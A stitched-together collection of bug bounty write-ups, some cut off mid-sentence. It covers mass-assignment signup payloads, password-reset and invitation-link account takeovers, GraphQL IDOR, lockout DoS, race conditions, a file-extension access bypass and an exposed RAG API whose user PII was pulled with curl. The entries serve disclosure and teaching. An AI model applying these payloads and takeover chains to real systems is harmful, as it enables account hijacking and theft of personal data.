User accounts often go through “states” — e.g., pending, active, suspended, or banned. If the backend logic relies on the user model to track this state, you can try to force your account directly into an “active” state, bypassing email verification or approval queues

POST /api/v1/register
{
  "username": "status_jumper",
  "email": "jump@example.com",
  "status": "active",
  "password": "Password1!"
}

POST /api/v1/register
{
  "username": "status_jumper",
  "email": "jump@example.com",
  "state": "verified",
  "password": "Password1!"
}

POST /api/v1/register
{
  "username": "status_jumper",
  "email": "jump@example.com",
  "email_verified": true,
  "password": "Password1!"
}
OAuth & Provider Spoofing
If the application supports “Sign in with Google/Facebook,” the user model likely stores a provider ID. If you register via the normal form but inject OAuth fields, you might trick the system into linking your password-based account to a legitimate admin’s social identity (if the validation logic is flawed).

POST /api/v1/register
{
  "username": "oauth_spoof",
  "email": "spoof@example.com",
  "provider": "google",
  "provider_id": "100234234234...", // ID of a victim
  "password": "Password1!"
}

POST /api/v1/register
{
  "username": "oauth_spoof",
  "email": "spoof@example.com",
  "auth_strategy": "ldap",
  "password": "Password1!"
}
Combination payload (high-value finding)
Mixing multiple techniques is one of the most effective ways to find real vulnerabilities. Some combinations bypass incomplete validation or trigger multiple deserialization paths at once.

POST /api/v1/register
{
  "username":"combo_user",
  "email":"combo.user+test@example.com",
  "password":"Password1!",
  "__proto__": {"isAdmin": true},
  "profile": {"role":"admin"},
  "metadata": "{\"elevate\":true}"
}
Conclusion
Mass-assignment bugs occur when backends trust incoming JSON too much. A harmless-looking signup request can overwrite sensitive fields if filtering isn’t strict. Testing the payload variations above helps reveal how the API handles different structures and types. Once these gaps are found, enforcing allowlists and validating each field becomes straightforward. Securing the signup flow strengthens the entire application.

Number: 14
title:0-Click Account Takeover Through a Simple Password Reset Parameter
id: writeup

But when I tried with a random email like testhehhhehe@gmail.com, the application replied:
 “We couldn't find an account with that email address.”
That’s a classic user enumeration vulnerability.

Step 2: Looking closer at the reset link
When I checked my email,

https://redacted.com/reset-password?email=shiohz0test@gmail.com&token=O4AiLBPhZNvr

The link had two parameters:

My email address
A reset token
When I opened it, I got the usual “Create new password” page. Nothing surprising so far.


Step 3: Just a small experiment
I decided to try something simple.

Become a member
I requested another reset link for the same email (shiohz0test@gmail.com). Once I received the fresh 
link with new token , I opened it but changed only one thing the email id in the URL. Instead of my 
original email, I swapped it with another test account I owned:

https://redacted.com/reset-password?email=testshiozhy@gmail.com&token=sYrUIKzYt46
And boom!
The page loaded perfectly, and it allowed me to reset the password of testshiozhy@gmail.com.
Remember: I had never requested a reset for this second account.
The application was making a huge mistake. It trusted the email parameter directly from the URL and did 
not validate whether the reset token truly belonged to that email. This mismatch allowed me to reset the
password of another user without their involvement

So with just one token (that I got for my own 

Number : 14 
title: Publicly Exposed RAG API Leading to Unauthenticated Access to PII and Internal System Data
id: writeup

Discovery Through Shodan
Shodan often reveals systems that organizations may not realize are exposed. While searching 
for common patterns related to development servers and machine learning pipelines, one specific
IP caught my eye because port 8081 was showing an active HTTP service. The banner looked interesting 
enough to analyze further, so I opened the address directly in a browser.

I also verified the response through curl:
curl http://[REDACTED]:8081/

The moment it loaded, it displayed a message saying:

{"message": "RAG Pipeline API is running"}
This indicated the server was meant to support some form of AI-related backend workflow. 
But more importantly, the page loaded without any authentication. This is unusual for a system that 
appears to be part of an internal backend pipeline.

At this point, the intention was still simple observation. But the lack of authentication hinted there 
could be more exposed behind the scenes.

Finding the OpenAPI Documentation
Many modern APIs include an automatically generated documentation file often exposed at /openapi.json or /swagger.json.While testing standard API documentation paths, /openapi.json responded with 200, exposing the entire API structure.

On this server, visiting:

http://[REDACTED]:8081/openapi.json
returned the complete OpenAPI specification.

This file alone contained hundreds of lines describing every endpoint, method, parameter, request structure, and expected response. It was effectively a full map of the system, including internal administrative routes.

The fact that this documentation was left publicly accessible already showed that the system lacked even basic restrictions.

Extracting All Endpoints
To better understand the API surface, I extracted all the paths from the OpenAPI file.

curl -s http://[REDACTED]:8081/openapi.json | jq '.paths | keys[]'
And then cleaned the output:

curl -s http://[REDACTED]:8081/openapi.json | jq -r '.paths | keys[]'
The result was a very large set of routes covering everything from authentication and dashboards
to file management and user details.

What stood out immediately was that the API was not just for a specific module. It included customer
and lead management, employee operations,
device tracking, dashboard analytics, file uploads and downloads, session controls, system and server status,
GDPR-related features, and notification systems.

This was clearly a production-grade system containing real organizational data.

Manual Testing of Endpoints
With a complete list of endpoints available, the next logical step was to open a few in the browser 
or with curl to verify whether they required authentication. Most secure systems would respond with either
an authentication error or a redirect to a login page.

However, this system responded with full JSON data.

The first endpoint tested was the user listing route:

curl http://[REDACTED]:8081/api/v1/users
It immediately returned a long list of user entries containing:

Full names
Email addresses
Mobile numbers
User roles
Login and logout timestamps
Presence indicators
Account creation times
This was concrete, real user information belonging to employees and admins. Browsing through the data revealed dozens 
of individuals, each with identifiable personal data. None of it was protected.

Number: 15
title: Account Takeover via IDOR in GraphQL Invitation Flow
id:
Lets assume the target as redacted, just like any other SaaS environment.

From the UI perspective the flow was extremely simple. There was an Invite Agents button.
I as evil.com was the owner of team and could invite agents/members in my team.

Clicking it opened a modal where I could enter one or more email addresses and send invites. This is a very common feature, 
so at this point nothing felt interesting or suspicious.
After entering an email of victim victim1234@gmail.com and clicking Invite, I switched my focus to Burp Suite. 
The application was using GraphQL, so instead of multiple REST endpoints everything was going through a single /graphql endpoint.
The request being sent looked like a standard GraphQL mutation.

The intercepted request looked like this:

POST /graphql/ HTTP/2
Host: redacted
Content-Type: application/json
{
 "operationName":"InviteAgentsFromInviteAgentModal",
 "query":"mutation InviteAgentsFromInviteAgentModal($emails: [String!]!) { inviteAgents(emails: $emails) 
{ success message invitations { id email __typename } failedEmailInvitations __typename } }",
 "variables":{
 "emails":["victim1234@gmail.com"]
 }
}

At first glance this looked harmless. I was simply inviting an email and the server was expected to send an 
invitation email. But then I looked at the response.
The server responded with the following JSON:

{
  "data": {
    "inviteAgents": {
      "success": true,
      "message": "Successfully invited agents",
      "invitations": [
        {
          "id": "4ffacc07efdecea45dc4a0f1c4a704e9d1",
          "email": "victim1234@gmail.com"
        }
      ],
      "failedEmailInvitations": []
    }
  }
}

That id immediately caught my attention. This was not just some internal identifier. 
I had seen similar looking values before in activation links. 
So instead of ignoring it, I copied the id and tried to understand where it was used.

From previous testing experience, I knew that invited users usually activate their accounts using a 
URL that looks something like /signup/activate/<token>. Previously I invited myself and the URL was like

https://[REDACTED]/signup/activate/eb3b13efdec3415384a0f1c4a773f576

So till /signup/activate/ it was static and we only need to change token. I replace the token that was received in response.
To my surprise, this took me straight to the account activation page. The page asked me to set a name and password for the account.
There was no requirement to click a link from the mailbox (Because we already got the token from response).
I filled in the details and set name as hacked account and submitted the form. The account was successfully created.

Press enter or click to view image in full size
The invited email now appeared as an active agent inside my team. The display name was exactly what I had entered 
during activation. At no point did I need access to the victim’s email inbox. Everything worked purely because the 
application exposed the activation token in the GraphQL response and trusted that token without any additional validation.

Lessons learned
Not every ID is harmless. If an identifier can change account state, it must be treated as a secret.
Email based flows must enforce proof of ownership on the server side, not just trust a token.
GraphQL responses can silently leak sensitive data if fields are exposed without strict review.
IDOR issues often appear when applications trust exposed identifiers without proper validation or scoping.

Number: 15
title: How a Simple Business Logic Flaw Caused an Account Lockout DoS
id: writeup

Hitting a Dead End in User Enumeration
The first weird behavior that I encountered was on the registration page itself. 
If an already registered email address was entered, a unique error message would appear,
which gave me the idea of user enumeration. The problem was that if an email did not exist,
the system would create a new account. If I automated this process, I could potentially end up
creating thousands of accounts — which I’m sure actual email owners wouldn’t be too happy about

Overcoming The Dead End
Nevertheless, I started thinking of ways to enumerate users without creating a new account every 
time an email did not exist. By default, when creating an account, a POST request was sent that 
looked something like this:

POST /Register/Username
Host: redacted.com

Email=user@gmail.com&Password=test

Out of curiosity I decided to remove “/Username” and add it as a custom parameter in the body of the request:

POST /Register/
Host: redacted.com

Username=Test&Email=user@gmail.com&Password=test

The result was that I could create accounts with custom usernames. It wasn’t anything particularly
important, but the fact that an account using the username “Test” was already created meant that no 
other account could use the same username. Then I wondered — what would happen if I resent the same 
request but changed the Email parameter to one that already exists in the system?

POST /Register
Host: redacted.com

Username=Test&Email=new@gmail.com&Password=test

Surprisingly, the response to this request contained only one error: that the username was already taken. 
This meant that if an email address didn’t exist, the system would not create a new account,
preventing the flooding issue that had been my problem before. With this, I finally had a reliable 
way to enumerate existing accounts!

Next Step
This alone wasn’t much of a vulnerability, and I knew it had to be chained with something else to 
raise the impact. While playing with the functionality of the application, I observed something interesting: 
after five failed login attempts at an account, the account gets locked for several minutes, with no way for 
the owner to unlock it until the lockout period passes. The problem was that, despite the lockout, 
it was still possible to send invalid login attempts directly via the API, which meant the account 
remained locked until requests stopped being sent.

Account Lockout DoS
That seemed very peculiar to me, but I assumed there would be some rate limiting in place to prevent abuse. 
It turned out I was wrong — there was no rate limit whatsoever. In simple terms, an attacker could continuously 
send invalid login attempts, keeping the account locked indefinitely, or at least until he decides to stop the attack.

Combining Pieces
Combined with the account enumeration issue, it was possible to identify valid email addresses and then launch a lockout 
attack, keeping users out of their accounts with no way to log back in.

Number: 16
# How a Simple Misconfiguration in the Invitation Link Led Me to Full Account Takeover
id: write up

The Initial Discovery
In the beginning, let’s assume the target is target.com. On this platform, you can create an organization, manage it, and 
invite people with different permissions. What we will focus on is the Invitation Link.

invitation link
When you invite someone to your organization, you send them a link. If the user doesn’t have an account, 
clicking the link automatically creates one for them. However, the problem arose when the invited person 
already had an existing account. When they clicked the link, it logged them into their account directly!

What is the normal scenario for an invitation link?
Usually, when a person opens an invite, they should be prompted to enter their password first — not be 
granted immediate access. Furthermore.

Second Issue: Reusable Invitation Link
The second problem is that the invitation link is not single-use.

It can be used an unlimited number of times It remains valid even after the user accepts or rejects the invitation 
The link never expires This introduces a serious security risk.

What Happens If the Link Is Leaked?

Now let’s ask an important question:What if the invitation link is leaked or obtained by an attacker in any way?

The result is simple and dangerous:

The attacker gets direct access to the victim’s account without:
Email
Password
Any authentication step
Just the link = full login access.
This scenario is exactly the same as the one that led me to my first bounty You can read that write-up here:


Bypassing Two-Factor Authentication (2FA)
After publishing that write-up, some people told me:

You should have tested whether the invitation link also bypasses 2FA

Unfortunately, at that time the vulnerability was already fixed, so I couldn’t test it.

But now, I had a very similar vulnerability, so I decided to try again.

I went to the account settings and enabled Two-Factor Authentication.

The process was standard:

The application generated a QR code
I scanned it using an Authenticator app (like Google Authenticator)
The app started generating time-based one-time passwords (TOTP) that change every few seconds
After confirming the code, 2FA was successfully enabled

Enable 2FA
After enabling 2FA, I opened the invitation link again.
And here came the surprise:
The invitation link bypasses 2FA as well.
So even if the victim believes their account is secured with two-factor authentication,
the invitation link has a different opinion.

The Most Interesting Part
At this point, I asked myself:

If the invitation link eventually expires (for example after 2–3 days),
how can I make my access to the account persistent, even after the link is no longer valid?

The first thing I thought about was whether I could change the victim’s email to my own email and then completely
remove the victim’s email, which would result in full account takeover.

So I navigated to the email change settings and added my own email address.

However, things did not go as expected. The application did not remove the victim’s email. Instead, 
it added my email as a secondary, unverified email and sent the email verification link to the victim’s email address.

The UI clearly showed that:
The victim’s email was still the primary and verified email
My email was listed as a secondary and Not confirmed email
As a result, the first attempt failed.

The Second thing I thought about was:
Some applications allow users to change the account password without requiring the current password, so I went to check 
this behavior in the account settings. However, this application required entering the current password first, which means
this approach was not applicable in this case.

I thought to myself:
Why not try response manipulation using Burp’s Match & Replace?
But first, I wanted to understand how the application verifies an email address.
So, I went to the account settings, refreshed the page, intercepted the request, and analyzed the response. I noticed the following:

Victim’s email → "isPrimary": true, "validatedAt": "2025-12-…"
My email → "isPrimary": false, "validatedAt": null
Now, let’s try response manipulation.

The idea was to modify the response by swapping the email values, making my email appear in place of the victim’s email, and the 
victim’s email appear in place of mine.

I navigated to Burp Proxy → Match & Replace,
selected Response body,
then placed the original response in field (5),
and the modified response in field (6).

I set up the match/replace rules and refreshed the page.

And here was the surprise

The UI now showed:

My email → Primary & Verified
Victim’s email → Not confirmed

Now my email is primary and victim’s email is Not confirmed now so I tried removing the victim’s email.
Unfortunately, it failed and returned an error.

Back to the ”Hero Image”
Do you remember the image I told you to remember?

Yes — the Change Password section.

There is an option:
“reset”

If you forget your current password, the application can send you a reset link, allowing you to set a new password again.

I asked myself:

If the UI shows my email as the primary one,
where will the password reset link be sent?

Bingo

I clicked Reset.

Then I opened my Gmail.
And here was the surprise
The password reset link for the victim’s account was sent to MY email. Not the victim’s.

This revealed another vulnerability:

Response Manipulation leading to Password Reset Hijacking
— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —

Completing the Takeover
I set a new password.

Now I asked myself:

Is my email verified permanently, or is this temporary?

Because if it’s not permanent, the victim could reset the password again and lock me out.

I checked the settings.

The victim’s email was still present, but:

My email now showed as Verified

jfjxxxx@gmail.com ==> victim’s email

faysxxxxx@gmail.com ==> my email

Adrenaline…
I then:
Set my email as the primary email and it worked!
Removed the victim’s email successfully!
Disabled 2FA (it required the password, which I now had)

Full Account Takeover Achieved
At this point:

Victim’s email → removed
2FA → disabled
Password → controlled by attacker
Account → fully owned

Number: 17
title: The Simple Bug That Led Me to My First Bounty (Account Takeover via Insecure Reusable Activation Link)
id: write 

The Discovery Phase

The vulnerability was quite simple initially, but it’s the kind of detail many people often overlook in application logic.

Let’s call the target website `target.com`.
When I created a new account, the application sent an Activation Link to my email to verify the account.
I clicked the link, and it immediately logged me into my account.

Press enter or click to view image in full size

Note: I spent some time understanding the site’s overall workflow, which took me a full day due to its size and the number of 
functions available. Understanding the Business Logic is crucial.

The next day, I was ready to start testing. I created another account and received the activation link.
I clicked it, and I was logged in immediately.

My mind paused: “Why was I logged in directly? Shouldn’t the link’s sole purpose be account verification, not granting a session?”

Standard Security Practice: An activation link should ideally be single-use. Its job is to change the account state from “unverified” 
to “verified” and then it should expire immediately.

Confirming the Vulnerability:
I tried opening the exact same activation link again.
The Surprise: It logged me into my account again!
This was the vulnerability: Every time I opened the activation link, it granted me direct access to the account. The activation link was 
functioning as a persistent, passwordless session token.

I quickly wrote the report, highlighting that the link was reusable and automatically logged the user in.

One day later, the security team responded:

Press enter or click to view image in full size

This response was a direct confirmation of the issue! The security team focused on the 48-hour expiration but ignored the core problem:

Reusability: The link can be used more than once.
Automatic Login: The link not only verifies but also authenticates the user.
These two factors combined transform a simple activation link into a 48-hour Account Takeover vulnerability!

Here is the summary of the follow-up I sent to clarify the security impact:

Press enter or click to view image in full size

After my detailed follow-up explaining the real security impact, they reopened the report and set the status to Under Review.

Seven days later, the surprise came: The vulnerability was accepted, and I was rewarded!

The Takeaway:

Always focus on the Business Logic and how the application is supposed to work securely. Small details in the workflow often 
lead to critical bugs. If your report is initially rejected, don’t give up — clearly articulate the Impact and the exploitation 
scenario with logical, security-focused reasoning.

Number: 18
title: A Simple IDOR That Ignored Platform Logic
id: writeup

Let’s assume the target as redacted , just like any housing rental application.

I had two advertisements under my account (one is Online and another is Offline). Interestingly, both advertisements had the same name :)
The first advertisement was named Test 12 test with an iguana picture. This one was online and available for rent. (I was also testing EXIF metadata ^_^).

The second advertisement was also named Test 12 test, but this one had a Starbucks picture and was offline, meaning it was not available for rent. 
(If I clicked the “FOR RENT” button on it, it would become online and available again.)

Now, when I tried visiting the publicly accessible URL of the offline advertisement: https://redacted/best/test_12_test/109

It loads successfully, but at top right, It showed an error saying:

“This housing is occupied....”
Nothing serious. Totally expected. Everything looked normal so far.

After that, I visited the advertisement that was available for rent: https://redacted/best/test_12_test/107
Here, I noticed something interesting. This page had an option called “Go to Message”, which was not present on the offline advertisement.
Okay, fair enough.

So I clicked on “Go to Message” to message the landlord and intercepted the request in Burp Suite. At first glance, it was a completely normal request. 
But one thing immediately caught my attention.
There was a parameter called advertisement_id=107 This ID clearly belonged to the online advertisement (yes, the iguana picture one).

As expected, I was able to send a message to the landlord of the available advertisement without any issue.

But this is where curiosity kicked in. I started wondering…
What if I change this advertisement_id to the one that belongs to the offline advertisement?
Press enter or click to view image in full size

We already know that advertisement IDs were visible directly in the URL, and they were sequential 
and incremental, which meant they could be easily guessed or brute-forced.

So I decided to change the value of advertisement_id from 107 → 109 and sent the request again.

I was redirected to the chat interface.
I was able to successfully message the landlord of an advertisement that was not available for rent.
In other words, the backend never validated whether the advertisement was online or offline before allowing the message action.

To confirm the impact, I did some additional testing using Intruder and was able to message multiple landlords whose advertisements were not available for rent.

This confirm the presence of IDOR vulnerability.

Lessons Learned
Always test backend behavior, not just what the UI allows or blocks
Sequential and predictable IDs are a huge red flag, never ignore them
Hidden buttons do not mean hidden functionality
Curiosity is key. One parameter changing often leads to the full bug

Number: 19
title: How I found a Race condition on Like Function 
id: Writeup 

Identifying the Issue
While digging into the application, I tried many different things like Privilege Escalation, Broken Authentication, and SQL Injection, but none of them worked. Then, once I saw the Like Function, I quickly decided to test for a race condition

Steps to Reproduce
Upload a photo once uploaded.
Open the intercept and click on the like button.
After capturing the request for the like, send it to the repeater and duplicate the request like 20 or 30 times.
Then, send them all as a single packet attack.

and BOOOM!!
Impact
This was a High vulnerability because the application was focusing on creating images and videos , and rating this images / videos

Number: 20
title: From 403 Forbidden to $$$$ How a Simple Extension Bypass Led to Unauthenticated Access to Private Documents
id: writrup

The target was a private HackerOne program that allows users to create organizations, upload documents, and share them naturally, 
documents created inside an organization are expected to be private by default, accessible only to authenticated and authorized users. 
Since the platform handles internal files (documents, images, reports, etc.), access control plays a critical role.
I decided to focus my testing on direct access to uploaded files.

## Initial Testing:

After identifying a document uploaded inside an organization, I tried accessing it directly via its URL: `https://target.com/folder/folder/this-secret-file`
The result was exactly what I expected: `403 Forbidden — You don’t have access`
I repeated the same test with different file extensions: `.png | .docx | .csv | etc..` All requests were blocked with a `403 Forbidden`.
At this point, the access control seemed solid.

## Trying One More Thing:
Before moving on, I decided to test the same request from a completely unauthenticated context (incognito browser) just to eliminate any session-related behavior. and guess what `Still blocked.`
Then, almost as a last check, I tried something simple:
I appended a `.pdf` extension to the same file path.
`https://target.com/folder/folder/this-secret-file.pdf ` <=== (incognito browser)
This time, the response was different.
Instead of 403 Forbidden, the server returned 200 OK, and the file content loaded successfully — without authentication.



